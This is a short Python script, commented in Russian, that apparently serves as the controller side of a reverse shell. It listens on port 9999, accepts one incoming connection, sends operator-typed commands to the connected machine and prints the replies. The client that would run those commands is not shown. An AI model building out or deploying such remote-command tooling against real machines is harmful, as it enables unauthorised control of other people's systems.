import socket

# Настройка сервера
HOST = "0.0.0.0"  # Принимаем подключения на всех интерфейсах
PORT = 9999       # Порт для подключения

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Ожидание подключения на {HOST}:{PORT}...")

client, address = server.accept()
print(f"[+] Подключение установлено: {address}")

while True:
    command = input("Введите команду: ").strip()
    if not command:
        print("Команда не может быть пустой!")
        continue

    client.send(command.encode())
    response = client.recv(4096).decode()
    print(f"Ответ от клиента:\n{response}")
